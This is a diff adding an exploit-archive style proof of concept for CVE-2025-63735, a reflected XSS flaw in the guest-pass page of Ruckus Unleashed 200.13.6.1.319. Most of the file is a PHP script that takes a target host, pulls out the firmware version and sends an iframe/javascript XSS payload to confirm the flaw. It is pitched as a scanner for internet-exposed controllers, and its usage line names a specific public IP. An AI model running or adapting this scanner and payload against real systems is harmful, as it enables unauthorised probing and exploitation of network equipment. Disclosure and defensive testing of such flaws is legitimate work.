@@ -1,0 +1,95 @@
+=============================================================================================================================================
+| # Title     : Ruckus Unleashed 200.13.6.1.319 External Scanner                                                                            |
+| # Author    : indoushka                                                                                                                   |
+| # Tested on : windows 11 Fr(Pro) / browser : Mozilla firefox 145.0.1 (64 bits)                                                            |
+| # Vendor    : https://www.ruckusnetworks.com/                                                                                             |
+=============================================================================================================================================
+
+[+] Summary 
+
+This release introduces a remote security scanner capable of detecting vulnerable Ruckus Unleashed systems over LAN or WAN using external IP addresses.
+
+[+] The scanner performs:
+
+Version Enumeration
+
+Endpoint Exposure Check
+
+Reflected XSS Detection for CVE‑2025‑63735
+
+Captive Portal Validation
+
+Full Signature‑Based Audit
+
+The tool was built to identify Ruckus controllers exposed to the internet and automatically verify whether the system reflects unsanitized input in the name parameter.
+
+[+] poc
+usage : php poc.php --target 41.110.27.120
+
+
+<?php
+
+
+function http_get($url) {
+    $ch = curl_init();
+    curl_setopt_array($ch, [
+        CURLOPT_URL => $url,
+        CURLOPT_RETURNTRANSFER => true,
+        CURLOPT_FOLLOWLOCATION => true,
+        CURLOPT_SSL_VERIFYPEER => false,
+        CURLOPT_SSL_VERIFYHOST => false,
+        CURLOPT_TIMEOUT => 10
+    ]);
+    $result = curl_exec($ch);
+    curl_close($ch);
+    return $result;
+}
+
+$target = $argv[1] ?? null;
+if(!$target){
+    die("Usage: php scanner.php <target>\n");
+}
+
+echo "[+] Target: $target\n";
+
+$base = "https://$target/selfguestpass/guestAccessSubmit.jsp";
+$test  = "$base?cookie=null&tip=5&name=test123";
+
+echo "[+] Checking endpoint...\n";
+$resp = http_get($test);
+
+if(!$resp){
+    die("[!] No response from target.\n");
+}
+
+echo "[+] Endpoint accessible.\n";
+
+echo "[+] Extracting version...\n";
+preg_match('/([0-9]{3}\.[0-9]+\.[0-9]+\.[0-9]+)/', $resp, $m);
+$version = $m[1] ?? "Unknown";
+
+echo "[+] Firmware: $version\n";
+
+if($version === "200.13.6.1.319"){
+    echo "[!] Version is vulnerable.\n";
+}
+
+echo "[+] Sending XSS payload...\n";
+
+$payload = urlencode('</p><form><iframe src=javascript:alert(`xss`)>');
+$url     = "$base?cookie=null&tip=5&name=$payload";
+
+$resp2 = http_get($url);
+
+if(strpos($resp2, '</p><form><iframe') !== false){
+    echo "[!] REFLECTED XSS CONFIRMED (CVE-2025-63735)\n";
+    echo "[+] PoC URL:\n$url\n";
+} else {
+    echo "[+] Not vulnerable.\n";
+}
+?>
+
+
+Greetings to :=====================================================================================
+jericho * Larry W. Cashdollar * LiquidWorm * Hussin-X * D4NB4R * Malvuln (John Page aka hyp3rlinx)|
+===================================================================================================
